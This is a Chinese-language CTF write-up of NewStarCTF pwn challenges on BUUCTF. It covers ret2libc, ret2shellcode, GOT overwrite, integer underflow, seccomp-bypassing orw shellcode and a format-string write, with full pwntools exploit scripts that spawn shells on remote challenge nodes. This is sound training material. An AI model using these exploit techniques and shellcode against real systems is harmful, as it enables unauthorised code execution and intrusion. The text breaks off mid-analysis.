        v6 = v9 / v10;
      }
      else if ( v4 == 120 )
      {
        v6 = v10 * v9;
      }
    }
    else if ( v4 == 43 )
    {
      v6 = v9 + v10;
    }
    if ( v6 != v5 )
    {
      handler((int)"%d");
      return;
    }
    a1 = "Right! Next!";
    puts("Right! Next!");
    --v7;
  }
  if ( v7 )
    handler((int)a1);
  else
    sub_BE9();
}
```

编写`Python`代码求解，算完100道算术题后，`cat flag`可得`flag{e1a1007a-ee74-4a32-b819-51249594c4fa}`。

```python
from pwn import *

def cal(x, y, opertor):
    if opertor == '+':
        return x+y
    elif opertor == '-':
        return x-y
    elif opertor == 'x':
        return x*y
    elif opertor == '/':
        return x/y
    else:
        return 0

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25690)
elf = ELF('./pwn')
for i in range(100):
    io.recvuntil(b"What's the answer? ")
    n1 = int(io.recvuntil(b' '))
    oper = io.recvuntil(b' ')[:-1].decode()
    n2 = int(io.recvuntil(b' =')[:-2])
    n = cal(n1, n2, oper)
    io.sendline(str(n).encode())
    log.success('%d %c %d = %d' % (n1, oper, n2, n))

io.interactive()
```

------

### ret2libc

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2libc]
└─$ file ./pwn
./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4a55aea407e818c5b33f682baba13f279efc2502, not stripped
                                                                                                                                                 
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2libc]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2libc/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF
  init(argc, argv, envp);
  puts("Glad to meet you again!What u bring to me this time?");
  fgets(s, 96, stdin);
  puts("Ok.See you!");
  return 0;
}
```

虽然`fgets()`函数限制了输入的字节数，但是并没有什么用，还是存在栈溢出漏洞。构造`payload`时`padding`一共需要`0x20+0x8`个字节才能覆盖到栈帧。

`X86_64`架构的函数参数分别保存在`RDI`、`RSI`、`RDX`、`RCX`、`R8`、`R9`，剩下的参数从右往左依次入栈。该程序函数调用的第一个参数由`rdi`寄存器传递，使用`ROPgadget`可以查看到`pop rdi; ret`的地址为`0x400753`，`ret`的地址是`0x40050e`。

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并利用`puts()`函数泄露`puts()`函数在`got`表中的真实地址。

编写`Python`代码，使用题目附件给的`libc-2.31.so`求解`libc`基地址，进而求得`system()`和`/bin/sh`的地址，构造`ROP`链执行`system('/bin/sh')`成功，`cat flag`得到`flag{a97738b3-773f-4299-bf67-5cfba5817cbf}`，提交即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27359)
elf = ELF('./pwn')
padding = b'a'*(0x20+0x8)
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400753 # pop rdi; ret
payload = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
io.recvuntil('Ok.See you!\n')
tmp = io.recvline()[:-1]
puts_addr = u64(tmp.ljust(8, b'\x00'))
log.info('puts_addr => %s = %s' % (repr(tmp), hex(puts_addr)))
ret = 0x40050e # ret
libc = ELF('./libc-2.31.so')
libcbase = puts_addr - libc.symbols['puts']
system_addr = libcbase + libc.symbols['system']
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh_addr))
payload = padding + p64(ret) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
io.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)
io.interactive()
```

------

### ret2shellcode

先`file ./pwn`查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2shellcode]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=0187c5cfc83d0e8e87248fa8b7b925fd559817bd, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/ret2shellcode]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/ret2shellcode/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  void *buf; // [rsp+28h] [rbp-8h]

  init(argc, argv, envp);
  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL); // prot=7 
  puts("Hello my friend.Any gift for me?");
  read(0, buf, 0x100uLL);
  puts("Anything else?");
  read(0, v4, 0x100uLL);
  puts("Ok.See you!");
  return 0;
}
```

注意到`mmap`函数，映射了一块起始地址为`0x233000`，长度为`0x1000uLL`的内存，`prot = 7`代表映射的内存可读可写可执行。

```c
void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);
/* start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。
 * length：代表将文件中多大的部分映射到内存。
 * prot：映射区域的保护方式。可以为以下几种方式的组合：
         PROT_EXEC 映射区域可被执行
         PROT_READ 映射区域可被读取
         PROT_WRITE 映射区域可被写入
         PROT_NONE 映射区域不能存取
 * flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。
         MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。
         MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。
         MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，对此区域作的任何修改都不会写回原来的文件内容。
         MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。
         MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。
         MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。
 * fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。
       有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。
 * offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。
 * 若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。
**/
// mmap(addr, len, prot, flags, fd, offset)
```

`shellcode`的构造如下：

```python
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
# shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
```

编写`Python`代码求解，将`shellcode`写入`buf`中，然后用`0x30+0x8`个字节填充`padding`覆盖到栈帧，将返回地址覆盖为`buf`的起始地址`0x233000`，拿到靶机`shell`权限后`cat flag`，提交`flag{f13f4a58-3293-4fae-a90b-c26fe0f71e5c}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 27593)
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
io.sendlineafter(b'Hello my friend.Any gift for me?\n', shellcode)
payload = b'a'*(0x30+0x8) + p64(0x233000)
io.sendlineafter(b'Anything else?\n', payload)
io.interactive()
```

------

### fallw1nd’s gift

先`file ./fallw1nd_gift `查看文件类型，再`checksec --file=./fallw1nd_gift`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/fallw1nd’s gift]
└─$ file ./fallw1nd_gift 
./fallw1nd_gift: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d1fe46636250f6e722c2df9769c4a30b3da9d2f7, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/fallw1nd’s gift]
└─$ checksec --file=./fallw1nd_gift 
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/fallw1nd’s gift/fallw1nd_gift'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF

  buf[1] = (void *)__readfsqword(0x28u);
  init(argc, argv, envp);
  puts("fallw1nd says you are the best pwnner,he will give you a gift as reward:");
  printf("%p", &puts);
  puts("\nnow input your addr:");
  __isoc99_scanf("%p", buf);
  puts("now input your content:");
  read(0, buf[0], 0x10uLL);
  puts("/bin/sh");
  exit(0);
}
```

程序直接用`printf`把`puts`函数的真实地址输出了，可以用这个地址来泄露`libc`基地址计算`system`函数的地址，`scanf("%p", buf);`这行代码可以到达任意一个地址，`read(0, buf[0], 0x10uLL);`能直接覆盖地址的内容。注意到程序中有行代码`puts("/bin/sh");`，我们可以考虑将`puts`的`got`表中存放的内容修改为`system`的地址，这样程序在执行`puts("/bin/sh");`时调用`puts_got`就会跳转到`system`的地址执行`system("/bin/sh")`，从而获得靶机的`shell`权限。`scanf("%p", buf)`只接收十六进制数，所以我们先把`puts`的`got`表所在地址赋值给`buf`，然后利用`read()`函数将`buf`中的内容修改为`system()`函数的地址，最后程序执行`system("/bin/sh")`。这题的一个坑就是`LibcSearcher`找到的`libc`版本都不对，用[**ret2libc**](#ret2libc)这题给出的`libc`能打通。编写`Python`代码求解，拿到靶机的`shell`权限后`cat flag`，提交`flag{ae50f983-a8e2-49fe-b4b3-b1f44033241e}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29776)
elf = ELF('./fallw1nd_gift')
io.recvuntil(b'fallw1nd says you are the best pwnner,he will give you a gift as reward:\n')
puts_addr = int(io.recvline()[:-1], 16)
log.info('puts_address => %#x' % puts_addr)
io.recvuntil(b'now input your addr:\n')
puts_got = elf.got['puts']
io.sendline(hex(puts_got))
libc = ELF('./libc-2.31.so')
libcbase = puts_addr - libc.symbols['puts']
log.success('libcbase_address => %s', hex(libcbase))
system_addr = libcbase + libc.symbols['system']
log.success('system_address => %s', hex(system_addr))
bin_sh_addr = 0x402082
payload = p64(system_addr)
io.sendlineafter(b'now input your content:', payload)
io.interactive()
```

------

### uint32 and ret

先`file ./uint `查看文件类型，再`checksec --file=./uint`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/uint32 and ret]
└─$ file ./uint
./uint: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d653cac952aa813e9606cf34e1d680c4c354ee1d, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/uint32 and ret]
└─$ checksec --file=./uint
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/uint32 and ret/uint'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

用`IDA Pro 64bit`打开附件`uint`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  puts("hello world");
  vuln();
  return 0;
}
```

双击`vuln()`函数查看详情，`read(0, buf, (unsigned int)nbytes)`这行语句可能造成栈溢出漏洞。 

```c
ssize_t vuln()
{
  char buf[72]; // [rsp+0h] [rbp-50h] BYREF
  int v2; // [rsp+48h] [rbp-8h] BYREF
  size_t nbytes; // [rsp+4Ch] [rbp-4h]

  LODWORD(nbytes) = 48;
  v2 = 0;
  puts("If you can find something is special,you are a half success!");
  __isoc99_scanf("%u", &v2);
  LODWORD(nbytes) = nbytes - v2;
  puts("twice");
  return read(0, buf, (unsigned int)nbytes);
}
```

我们先计算下`payload`需要多少个字符，在`Functions window`中看到`backdoor`函数的返回值是`system("/bin/sh")`，其相应地址为`0x4011be`，构造完的`payload`长度为`0x60`字节。

```python
from pwn import *

payload = b'a'*(0x50+0x8)+p64(0x4011be)
print(hex(len(payload))) # 0x60
```

`LODWORD(nbytes) = 48;`只有`0x30`字节，当用户输入的`v2`使得`0x30-v2`的无符号整型数值不小于`0x60`时就能造成栈溢出漏洞，`scanf`中`%u`是以`unsigned int`型读入正数，所以需要将占`4`字节的小端有符号整数`-48`转换成小端无符号整数`4294967248`，这样程序在执行完`LODWORD(nbytes) = nbytes - v2;`后的`(unsigned int)nbytes`数值就能为`0x60`，从而造成栈溢出漏洞。编写`Python`代码求解可得`flag{0fb641a6-ff72-4932-a281-2a00a91001e5}`。

```python
from pwn import *

io = remote('node4.buuoj.cn', 25048)
io.recvuntil(b'If you can find something is special,you are a half success!\n')
n = int.from_bytes((-48).to_bytes(4, 'little', signed=True), 'little', signed=False) # 4294967248
io.sendline(str(n))
payload = b'a'*(0x50+0x8)+p64(0x4011be)
io.sendlineafter(b'twice\n', payload)
io.interactive()
```

------

### shellcode-revenge

先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cbac893326c4db726742a35949dfbfb0fc23e24e, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/shellcode-revenge/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  void *buf; // [rsp+28h] [rbp-8h]

  init(argc, argv, envp);
  sandbox();
  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Well.Just a little.");
  read(0, buf, 0x1AuLL);
  puts("Let's see what u can do this time~");
  read(0, v4, 0x100uLL);
  puts("See you!");
  return 0;
}
```

注意到`mmap`函数，映射了一块起始地址为`0x233000`，长度为`0x1000uLL`的内存，`prot = 7`代表映射的内存可读可写可执行。第一个`read`函数往该内存区域写入，第二个`read`函数能造成栈溢出漏洞。如果这题没有开启沙盒的话解题思路很简单，只需要先将`shellcode`写入`buf`中，再利用栈溢出漏洞把返回地址覆盖为shellcode的所在地址。

```c
void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);
/* start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。
 * length：代表将文件中多大的部分映射到内存。
 * prot：映射区域的保护方式。可以为以下几种方式的组合：
         PROT_EXEC 映射区域可被执行
         PROT_READ 映射区域可被读取
         PROT_WRITE 映射区域可被写入
         PROT_NONE 映射区域不能存取
 * flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。
         MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。
         MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。
         MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，对此区域作的任何修改都不会写回原来的文件内容。
         MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。
         MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。
         MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。
 * fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。
       有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。
 * offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。
 * 若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。
**/
// mmap(addr, len, prot, flags, fd, offset)
```

通过`seccomp-tools`可知不能调用系统函数`system`，我们需要利用`orw`来解题。第一个`read`函数只能读入`0x1a`字节，也就是说只能读入一个函数，因此我们可以先构造一个可以读取足够多字节的`read`。`payload = asm(shellcraft.read(0, '0x233014', 0x42))`的长度为`14`字节。接着利用第二个`read`函数构造栈溢出漏洞让程序执行写入到地址`0x233000`中的`read(0, '0x233014', 0x42)`，这样就能读入`orw`中的三个函数：`open`打开`flag`文件，`read`读取`flag`中的文件到`rsp`寄存器中，`write`将`rsp`中`flag`文件内容写入到标准输出中进行输出显示。只要`orw`是紧挨着`read`函数写入的，程序就能顺序执行，并不需要再`ret`跳转。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
└─$ seccomp-tools dump ./pwn      
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012
 0004: 0x15 0x07 0x00 0x0000009d  if (A == prctl) goto 0012
 0005: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0012
 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012
 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012
 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012
 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012
 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

编写`Python`代码求解可得`flag{e2b3063c-cead-4d25-8879-4b22ba877e23}`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 29841)
elf = ELF('./pwn')
payload = asm(shellcraft.read(0, '0x233014', 0x42)) # len(payload) = 14
io.sendlineafter(b'Well.Just a little.\n', payload)
payload = b'a'*(0x30+0x8) + p64(0x233000)
io.sendlineafter(b"Let's see what u can do this time~\n", payload)
shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('rax', 'rsp', 0x100)
shellcode += shellcraft.write(1, 'rsp', 0x100)
payload = asm(shellcode)
io.sendlineafter('See you!\n', payload)
io.interactive()
```

------

### 砍一刀

先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/砍一刀]
└─$ file ./pwn           
./pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e19953563c17da5e6a1207df964a0a86452cc335, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/砍一刀]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/砍一刀/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

附件给出了`pwn.c`，可以直接看到其源码如下：

```c
#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

int init();
void game();
void getcard();
void getdiamond();
void success();
int cipher();

int diamond=5;

int init(){
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
}

void game(){
    float money=0;
    int key=0;
    printf("NewstarCTF送你现金红包啦!\n\n");
    sleep(1.5);
    printf("恭喜你成为幸运星，最高可提现100元红包！\n\n");
    sleep(1.5);
    printf("恭喜你获得一张百元现金卡，使用可以加速领红包！\n\n");
    printf("按回车键使用现金卡……\n\n");
    getchar();
    sleep(1.5);
    printf("成功使用百元现金卡，获得50元现金！\n\n");
    money+=50;
    sleep(1.5);
    printf("今日难度降低，送你30元现金！\n\n");
    money+=30;
    sleep(1.5);
    printf("第一次参加活动，再送你10元现金！\n\n");
    money+=10;
    sleep(1.5);
    printf("感谢你对NewstarCTF的大力支持，再送你9元现金！\n\n");
    money+=9;
    sleep(1.5);
    printf("真棒！仅剩1%%提现红包！\n\n");
    sleep(1.5);
    printf("还有66人正在提现红包，你的提现进度第一，将最先提现！\n\n");
    sleep(1.5);
    printf("回车一下，再砍一刀\n\n");
    getchar();
    sleep(1.5);
    printf("恭喜获得0.45元现金！\n\n");
    sleep(1.5);
    printf("送你现金翻倍卡，更快提现！\n\n");
    sleep(1.5);
    printf("翻倍生效中……成功翻2倍！\n0.45元----->0.9元\n\n");
    money+=0.9;
    sleep(1.5);
    printf("距离提现只有一步之遥啦，输入口令666领取红包！\n");
    cipher();
    printf("\n口令正确，送你0.05元现金！\n\n");
    sleep(1.5);
    printf("翻倍生效中……成功翻2倍！\n0.05元----->0.1元\n\n");
    money+=0.1;
    sleep(1.5);
    printf("恭喜你集齐100元红包！\n\n");
    sleep(1.5);
    printf("赶紧分享给好友庆祝一下吧！\n\n");
    sleep(1.5);
    printf("按回车键分享给好友~\n\n");
    getchar();
    printf("分享成功！\n\n");
    getcard();
}

void getcard(){
    srand((unsigned int)time(NULL));
    int luck=0;
    int coin=0;
    printf("有好友帮你砍一刀，成功获得500金币！\n");
    coin+=500;
    sleep(1.5);
    printf("有好友帮你砍一刀，成功获得400金币！\n");
    coin+=400;
    sleep(1.5);
    printf("=======================================\n");
    printf("集齐1000金币，兑换提现卡，马上提现红包！\n");
    printf("=======================================\n");
    sleep(1.5);
    printf("马上就能兑换提现卡啦，赶紧邀请好友帮你砍一刀吧！\n");
    printf("当前金币：%d个\n\n",coin);
    while(1){
        printf("按回车键邀请好友砍一刀，领取金币~\n");
        getchar();
        sleep(1);
        printf("有好友帮你砍一刀啦!");
        if(coin==999){
            luck=rand()%101;
            if((luck%10)==0){
                printf("==========================================================\n");
                printf("恭喜你触发隐藏福利，集齐10颗钻石兑换1金币，加速兑换提现卡！\n");
                printf("==========================================================\n");
                getdiamond();
            }
            else{
                printf("很遗憾本次未获得金币……\n");
            }
        }
        else{
            if(coin>=900&&coin<990){
                printf("成功获得10金币……\n");
                coin+=10;
            }
            else{
                printf("成功获得1金币……\n");
                coin+=1;
            }
        }
        printf("当前金币：%d个\n\n",coin);
    }
}   

void getdiamond(){
    int luck=0;
    char password[100];
    printf("======================\n");
    printf("你真幸运，送你5颗钻石！\n");
    printf("======================\n");
    sleep(1.5);
    printf("马上就能集齐钻石啦，赶紧邀请好友帮你砍一刀吧！\n\n");
    while(1){
        if(diamond==10){
            success();
        }
        else{
            printf("按回车键邀请好友砍一刀，领取钻石~\n");
            getchar();
            sleep(1);
            printf("有好友帮你砍一刀啦!");
            if(diamond==9){
                luck=rand()%101;
                if((luck%10)==0){
                    printf("===============================================================\n");
                    printf("你意外触发了隐藏福利！离成功就差一点点啦，输入神秘口令领取钻石！\n");
                    printf("===============================================================\n");
                    sleep(1);
                    printf("输入口令==>");
                    init();
                    read(0,password,101);
                    printf(password);
                }
                else{
                    printf("很遗憾本次未获得钻石……\n");
                }
            }
            else{
                printf("成功获得1钻石！\n");
                diamond+=1;
            }
        }
        printf("当前钻石：%d颗\n\n",diamond);
    }
}

void success(){
    printf("===================\n");
    printf("恭喜你集齐10颗钻石！\n");
    printf("===================\n");
    sleep(1.5);
    printf("按回车键兑换金币！\n\n");
    sleep(1.5);
    printf("金币兑换成功！\n\n");
    sleep(1.5);
    printf("===================\n");
    printf("恭喜你集齐1000金币！\n");
    printf("===================\n");
    sleep(1.5);
    printf("按回车键兑换提现卡！\n\n");
    sleep(1.5);
    printf("提现卡兑换成功！\n\n");
    sleep(1.5);
    printf("正在使用提现卡");
    sleep(1.5);
    printf("...");
    sleep(1.5);
    printf("...");
    sleep(1.5);
    printf("...\n");
    sleep(1.5);
    printf("恭喜你成功提现红包！正在飞速转账~");
    sleep(1.5);
    printf("...");
    sleep(1.5);
    printf("...\n");
    printf("转账成功！\n");
    system("/bin/sh");
}

int cipher()
{
    printf("==>");
    int n, judge;
    scanf("%d", &n);
    judge = getchar();
    while(n != 666)
    {
        fflush(stdin);
        printf("口令错误，请重新输入\n==>");
        scanf("%d", &n);
        judge = getchar();
    }
    return n;
}

int main(){
    init();
    game();
}
```

编写`Python`代码求解可得`flag{36fd0fba-210e-4cfe-9e73-947e94bea761}`。

```python
from pwn import *

# context(arch='amd64', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 25352)
io.send(b'\x00')
io.send(b'\x00')
io.sendlineafter(b'==>', b'666')
while True:
    tmp = io.recvuntil(b'~')
    log.info(tmp)
    io.send(b'\x00')
    io.recvline()
    tmp = io.recvline()
    if b'=' in tmp:
        log.info(tmp)
        break
while True:
    tmp = io.recvuntil(b'~')
    log.info(tmp)
    io.send(b'\x00')
    io.recvline()
    tmp = io.recvline()
    if b'=' in tmp:
        log.info(tmp)
        break
log.info(io.recvuntil(b'==>'))
# payload = b'%p'*0x20 + p64(0x404090) # 得到首地址偏移量16
payload = b'aaaaaaaaaa%16$na' + b'%p'*0x18 + p64(0x404090) # 定位到参数在栈上的位置以修改内容
io.sendline(payload)
log.info(io.recv())
io.interactive()
```

------

### cat flag

先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/cat flag]
└─$ file ./pwn
./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5e9560a621c83466c0a8427a73c1de760af1fe40, for GNU/Linux 3.2.0, not stripped

┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/cat flag]
└─$ checksec --file=./pwn
[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/cat flag/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  menu();
}
```

双击`menu()`函数查看详情，发现程序有`4`个功能。

```c
void __noreturn menu()
{
  int v0; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  v0 = 0;
  while ( 1 )
  {
    puts("\nchoose a command you want to execute.\n");
    puts("1-ls");
    puts("2-cat");
    puts("3-mv");
    puts("4-exit");
    printf("==>");
    __isoc99_scanf("%d", &v0);
    getchar();
    if ( v0 == 4 )
      break;
    if ( v0 <= 4 )
    {
      switch ( v0 )
      {
        case 3:
          editname();
          break;
        case 1:
          ls();
          break;
        case 2:
          cat();
          break;
      }
    }
  }
  exit(0);
}
```

双击`ls()`函数查看详情，系统调用`ls`功能。

```c
int ls()
{
  return system("ls");
}
```

双击`cat()`函数查看详情，先是输入一个文件名，如果文件名中不包含`.`和`/`的话，就开启一个新线程执行`cating`函数。

```c
int cat()
{
  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF

  newthread[1] = __readfsqword(0x28u);
  puts("Input the file name you want to cat.");
  read(0, name, 0x14uLL);
  if ( strchr(name, '.') || strchr(name, '/') )
    return printf("You bad bad~");
  name[strlen(name) - 1] = 0;
  if ( access(name, 0) )
    puts("The file does not exist");
  else
    pthread_create(newthread, 0LL, cating, 0LL);
  return 0;
}
```

